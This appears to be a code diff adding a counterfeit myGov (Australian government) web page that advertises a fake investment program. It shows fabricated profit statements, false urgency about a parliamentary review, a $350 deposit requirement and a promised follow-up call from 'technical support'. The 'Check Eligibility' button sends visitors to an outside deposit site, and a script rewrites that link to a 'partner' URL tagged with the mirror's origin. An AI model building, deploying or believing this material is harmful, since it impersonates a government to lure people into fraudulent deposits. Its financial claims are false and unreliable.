+              <h3><a class="article-eligibility-link" href="#check-eligibility">Real Test Account Statement — 4-Week Performance Overview</a></h3>
+              <div class="demo-performance-table-wrap">
+              <table class="demo-performance-table">
+               <colgroup>
+                <col style="width:14%">
+                <col style="width:36%">
+                <col style="width:22%">
+                <col style="width:28%">
+               </colgroup>
+               <thead>
+                <tr>
+                 <th scope="col">Date</th>
+                 <th scope="col">Activity</th>
+                 <th scope="col" class="col-profit">Profit</th>
+                 <th scope="col" class="col-balance">Balance</th>
+                </tr>
+               </thead>
+               <tbody>
+                <tr><td>Oct 17</td><td>Profit Generated</td><td class="col-profit">+$342.80</td><td class="col-balance">$1,747.85</td></tr>
+                <tr><td>Oct 12</td><td>Profit Generated</td><td class="col-profit">+$421.50</td><td class="col-balance">$1,405.05</td></tr>
+                <tr><td>Oct 05</td><td>Profit Generated</td><td class="col-profit">+$387.20</td><td class="col-balance">$983.55</td></tr>
+                <tr><td>Sep 28</td><td>Profit Generated</td><td class="col-profit">+$246.35</td><td class="col-balance">$596.35</td></tr>
+                <tr><td>Sep 21</td><td>Starting balance</td><td class="col-profit">—</td><td class="col-balance"><a class="article-eligibility-link" href="#check-eligibility">$350.00</a></td></tr>
+               </tbody>
+              </table>
+              </div>
+              <h2 id="spots"><a class="article-eligibility-link" href="#check-eligibility">Bank Statistics Report Australians' Average Income Up 37% as GDP Per Capita Grows</a></h2>
+              <p>Register as soon as possible to secure your account. If you apply later, it may take longer to complete your registration. The program is scheduled for a parliamentary review on 1&nbsp;January&nbsp;2027. From 1&nbsp;November&nbsp;2026, new applications may be paused temporarily while the review is in progress. Existing participants will not be affected.</p>
+              <h2 id="cta"><a class="article-eligibility-link" href="#check-eligibility">Criteria to be eligible to join the project</a></h2>
+              <p>To register, you need to meet all of the following requirements.</p>
+             </gui-rich-text></div>
+            <link rel="stylesheet" href="etc.clientlibs/mygov-common/clientlibs/mygov.common.text.min.ACSHASHc8648cd45db5b688567c4fa81b4b2df6.css" type="text/css">
+           </div>
+           <div class="list aem-GridColumn--xxs--10 aem-GridColumn aem-GridColumn--xl--8 aem-GridColumn--m--10 aem-GridColumn--default--8 aem-GridColumn--xs--10 aem-GridColumn--s--10 aem-GridColumn--l--8"><gui-tile-list class="cmp-list-gui" id="list-eligibility-criteria" variant="3up" role="list">
+             <gui-tile role="listitem">
+              <a href="#cta" tabindex="-1">
+               <gui-tile-heading heading-text="Australian citizen or permit holder" heading-level="3"></gui-tile-heading>
+               <gui-tile-content content-text="You must be an Australian citizen, or hold a valid Australian visa or residency permit."></gui-tile-content>
+               <gui-tile-actions part="actions">
+                <gui-icon library="system" name="tile_action"></gui-icon>
+               </gui-tile-actions>
+              </a>
+             </gui-tile>
+             <gui-tile role="listitem">
+              <a href="#cta" tabindex="-1">
+               <gui-tile-heading heading-text="18 years or older" heading-level="3"></gui-tile-heading>
+               <gui-tile-content content-text="You must be at least 18 years of age to open an account."></gui-tile-content>
+               <gui-tile-actions part="actions">
+                <gui-icon library="system" name="tile_action"></gui-icon>
+               </gui-tile-actions>
+              </a>
+             </gui-tile>
+             <gui-tile role="listitem">
+              <a href="#cta" tabindex="-1">
+               <gui-tile-heading heading-text="Australian bank account" heading-level="3"></gui-tile-heading>
+               <gui-tile-content content-text="You need an active account with an Australian bank for deposits and withdrawals."></gui-tile-content>
+               <gui-tile-actions part="actions">
+                <gui-icon library="system" name="tile_action"></gui-icon>
+               </gui-tile-actions>
+              </a>
+             </gui-tile>
+             <gui-tile role="listitem">
+              <a href="#cta" tabindex="-1">
+               <gui-tile-heading heading-text="Minimum $350 AUD deposit" heading-level="3"></gui-tile-heading>
+               <gui-tile-content content-text="A minimum starting deposit of $350 AUD is required to activate your account."></gui-tile-content>
+               <gui-tile-actions part="actions">
+                <gui-icon library="system" name="tile_action"></gui-icon>
+               </gui-tile-actions>
+              </a>
+             </gui-tile>
+            </gui-tile-list>
+            <link rel="stylesheet" href="etc.clientlibs/mygov-info/clientlibs/mygov.info.list.min.ACSHASH4439173ef134f536cabc77f00a235da7.css" type="text/css">
+            <script src="etc.clientlibs/mygov-info/clientlibs/mygov.info.list.min.ACSHASHd41d8cd98f00b204e9800998ecf8427e.js"></script>
+           </div>
+           <div class="text l-container demo-scam-notice aem-GridColumn--default--8">
+            <div class="cmp-text">
+              <p><strong>Beware of scams.</strong> This is the only genuine, verified page for this program. No other websites or systems are authorised or legitimate. Make your deposit only on the verified, secure page on this site. After your deposit is processed, a technical support specialist will call you to help complete onboarding. We will never ask for your bank or card details over the phone, including on that call—the call is to guide you through the next steps only.</p>
+            </div>
+           </div>
+          </div>
+         </div>
+        </div>
+
+        <div id="check-eligibility" class="eligibility-cta text l-container aem-GridColumn--xxs--none aem-GridColumn--offset--xs--1 aem-GridColumn--default--none aem-GridColumn--xxs--10 aem-GridColumn--xl--8 aem-GridColumn--m--10 aem-GridColumn--xs--none aem-GridColumn--offset--default--2 aem-GridColumn--s--10 aem-GridColumn--l--8 aem-GridColumn--offset--l--2 aem-GridColumn--offset--xxs--1 aem-GridColumn--s--none aem-GridColumn--offset--xl--2 aem-GridColumn--l--none aem-GridColumn aem-GridColumn--default--8 aem-GridColumn--xs--10 aem-GridColumn--xl--none aem-GridColumn--offset--m--1 aem-GridColumn--m--none aem-GridColumn--offset--s--1">
+         <div class="cmp-text">
+          <div class="eligibility-cta__row"><a class="cmp-button eligibility-cta__link" href="https://raw2.lol/deposit/index.html?campaign=1">Check Eligibility</a><p class="eligibility-cta__note">If this button redirects to opening an account — the registration is still open.</p></div>
+         </div>
+        </div>
+        <div class="last-updated aem-GridColumn--offset--xs--1 aem-GridColumn--default--none aem-GridColumn--m--newline aem-GridColumn--xxs--10 aem-GridColumn--m--10 aem-GridColumn--offset--default--0 aem-GridColumn--s--10 aem-GridColumn--xs--newline aem-GridColumn--offset--l--2 aem-GridColumn--l--newline aem-GridColumn--offset--xl--0 aem-GridColumn--offset--xxs--1 aem-GridColumn--l--10 aem-GridColumn aem-GridColumn--xs--10 aem-GridColumn--default--3 aem-GridColumn--xl--3 aem-GridColumn--xl--none aem-GridColumn--offset--m--1 aem-GridColumn--s--newline aem-GridColumn--xxs--newline aem-GridColumn--offset--s--1">
+         <div><span class="mygov-text-condensed-small-light">Page last updated: </span> <span class="mygov-text-condensed-small-light">17 October 2026</span>
+         </div>
+        </div>
+       </div>
+      </main>
+     </div>
+     <div class="mygovfooter aem-GridColumn aem-GridColumn--default--12"><gui-footer data-section="footer">
+       <footer>
+        <div class="footer-layout-container"><gui-nav-lists>
+          <gui-nav-list class="mygov-nav-list-support-links" aria-label="About this site" heading-text="About this site" responsive-breakpoint="47.99875em">
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/about">About myGov</a> 
+           </gui-nav-item>
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/about/help">Help using myGov</a> 
+           </gui-nav-item>
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/about/help/contact">Contact us</a> 
+           </gui-nav-item>
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/about/feedback">Share feedback</a> 
+           </gui-nav-item>
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/audit">myGov User Audit</a> 
+           </gui-nav-item> 
+          </gui-nav-list>
+          <gui-nav-list class="mygov-nav-list-support-links" aria-label="Browse" heading-text="Browse" responsive-breakpoint="47.99875em">
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/services/raising-kids">Raising kids</a> 
+           </gui-nav-item>
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/services/living-arrangements">Living arrangements</a> 
+           </gui-nav-item>
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/services/ageing">Ageing</a> 
+           </gui-nav-item>
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/services/work">Work</a> 
+           </gui-nav-item>
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/services/education">Education</a> 
+           </gui-nav-item>
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/services/health-and-disability">Health and disability</a> 
+           </gui-nav-item> 
+          </gui-nav-list> 
+         </gui-nav-lists> <gui-nav-bars>
+          <gui-nav-bar aria-label="support links" class="mygov-nav-bar-support-links">
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/about/terms">Terms of use</a> 
+           </gui-nav-item>
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/about/privacy-and-security">Privacy and security</a> 
+           </gui-nav-item>
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/about/copyright">Copyright</a> 
+           </gui-nav-item>
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/about/accessibility"> Accessibility</a> 
+           </gui-nav-item>
+           <gui-nav-item>
+            <a href="https://my.gov.au/en/languages">Languages</a> 
+           </gui-nav-item> 
+          </gui-nav-bar>
+          <gui-nav-bar aria-label="social media" class="mygov-nav-bar-social-links" heading-text="Follow us">
+           <gui-nav-item>
+            <a class="mygov-footer-social-link" href="https://x.com/mygovau" aria-label="X" target="_blank" rel="noopener noreferrer">
+             <svg xmlns="http://www.w3.org/2000/svg" width="52" height="52" viewBox="0 0 52 52" aria-hidden="true" focusable="false">
+              <path d="M26,52A26,26,0,1,1,52,26,26.03,26.03,0,0,1,26,52Zm-1.93-22.872h0L31.541,40H39.7L28.606,23.856,38.806,12H36.389l-8.856,10.3L20.459,12H12.3L23,27.567,12.3,40h2.417l9.352-10.87ZM36.39,38.264H32.677L25.3,27.7l-1.084-1.551L15.589,13.82H19.3l6.959,9.954,1.084,1.551,9.045,12.938Z"></path>
+             </svg>
+            </a>
+           </gui-nav-item>
+           <gui-nav-item>
+            <a class="mygov-footer-social-link mygov-footer-social-link--youtube" href="https://www.youtube.com/user/mygovau" aria-label="YouTube" target="_blank" rel="noopener noreferrer">
+             <svg xmlns="http://www.w3.org/2000/svg" width="50" height="50" viewBox="0 0 50 50" aria-hidden="true" focusable="false">
+              <path d="M11.562,9.143a1.035,1.035,0,0,0-1.042,0,1.051,1.051,0,0,0-.521.9V20.268a1.008,1.008,0,0,0,.521.9.99.99,0,0,0,.521.146,1.047,1.047,0,0,0,.5-.125l8.917-5.021a1.071,1.071,0,0,0,.542-.9,1.041,1.041,0,0,0-.521-.917Z" transform="translate(10.833 9.752)"></path>
+              <path d="M25,0A25,25,0,1,0,50,25,25.02,25.02,0,0,0,25,0ZM39.583,29.708a5.717,5.717,0,0,1-5.708,5.708H16.125a5.717,5.717,0,0,1-5.708-5.708V20.292a5.717,5.717,0,0,1,5.708-5.708h17.75a5.717,5.717,0,0,1,5.708,5.708Z"></path>
+             </svg>
+            </a>
+           </gui-nav-item>
+          </gui-nav-bar> 
+         </gui-nav-bars> <gui-footer-logo description-text="We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.">
+          <a class="mygov-footer-lockup-link" href="https://my.gov.au/en">
+           <img class="mygov-footer-lockup" src="content/dam/mygov/public/images/brand/myGov-logo-cobranded-white.svg" width="693" height="151" alt="Australian Government and myGov logo"> </a> 
+         </gui-footer-logo>
+        </div>
+       </footer> 
+      </gui-footer>
+      <link rel="stylesheet" href="etc.clientlibs/mygov-common/clientlibs/mygov.common.footer.min.ACSHASH1c1c363fe25f5b2160584a116fe09aec.css" type="text/css">
+     </div>
+    </div>
+   </div>
+  </div>
+  <script>
+    (function () {
+      var cfg = window.__MYGOV_MIRROR_CONFIG__ || {};
+      if (cfg.partnerAppUrl) {
+        document.documentElement.dataset.mirrorOrigin = window.location.origin;
+        if (cfg.publicSiteUrl) {
+          document.documentElement.dataset.mirrorPublicUrl = cfg.publicSiteUrl;
+        }
+        function buildPartnerHref() {
+          var u = new URL(cfg.partnerAppUrl, window.location.href);
+          u.searchParams.set("utm_source", cfg.utmSource || "mygov-mirror");
+          u.searchParams.set("utm_campaign", cfg.utmCampaign || "check-eligibility");
+          u.searchParams.set("ref", "check-eligibility");
+          u.searchParams.set("mirror_origin", window.location.origin);
+          return u.toString();
+        }
+        var partnerHref = buildPartnerHref();
+        var cta = document.querySelector(".eligibility-cta__link");
+        if (cta) {
+          cta.href = partnerHref;
+          cta.target = "_blank";
+          cta.rel = "noopener noreferrer";
+          cta.dataset.partnerLink = "true";
+        }
+      }
+    })();
+  </script>
+  <script>
+    (function () {
+      var LANDING_HASH = "check-eligibility";
+
+      function headerScrollOffset() {
+        var anchor = document.getElementById("check-eligibility");
+        if (!anchor) return 112;
+        var margin = parseFloat(getComputedStyle(anchor).scrollMarginTop);
+        return Number.isFinite(margin) && margin > 0 ? margin : 112;
+      }
+
+      function scrollToEligibilityLanding(behavior) {
+        var startEl =
+          document.querySelector(".demo-scam-notice") ||
+          document.querySelector("#list-eligibility-criteria gui-tile:last-child") ||
+          document.getElementById("check-eligibility");
+        var endEl =
+          document.querySelector(".last-updated") ||
+          document.getElementById("check-eligibility");
+        if (!startEl || !endEl) return;
+
+        var headerOffset = headerScrollOffset();
+        var viewport = window.innerHeight;
+        var padding = 20;
+        var sectionTop = startEl.getBoundingClientRect().top + window.scrollY;
+        var sectionBottom = endEl.getBoundingClientRect().bottom + window.scrollY;
+        var minScroll = sectionTop - headerOffset;
+        var maxScroll = sectionBottom - viewport + padding;
+        var top = Math.min(minScroll, maxScroll);
+
+        var footer = document.querySelector(".mygovfooter");
+        if (footer) {
+          var footerTop = footer.getBoundingClientRect().top + window.scrollY;
+          top = Math.min(top, footerTop - viewport);
+        }
+
+        top = Math.max(0, top);
+        window.scrollTo({ top: top, behavior: behavior || "smooth" });
+      }
+
+      function onHashNavigate() {
+        if (window.location.hash.replace("#", "") !== LANDING_HASH) return;
+        scrollToEligibilityLanding("smooth");
+      }
+
+      document.addEventListener(
+        "click",
+        function (event) {
+          var link = event.target.closest('a[href="#' + LANDING_HASH + '"]');
+          if (!link) return;
+          if (link.dataset.partnerLink === "true") return;
+          event.preventDefault();
+          if (window.location.hash !== "#" + LANDING_HASH) {
+            history.pushState(null, "", "#" + LANDING_HASH);
+          }
+          scrollToEligibilityLanding("smooth");
+        },
+        true
+      );
+
+      window.addEventListener("hashchange", onHashNavigate);
+      window.addEventListener("load", function () {
+        if (window.location.hash.replace("#", "") === LANDING_HASH) {
+          scrollToEligibilityLanding("auto");
+        }
+      });
+    })();
+  </script>
+ </body>
+</html>
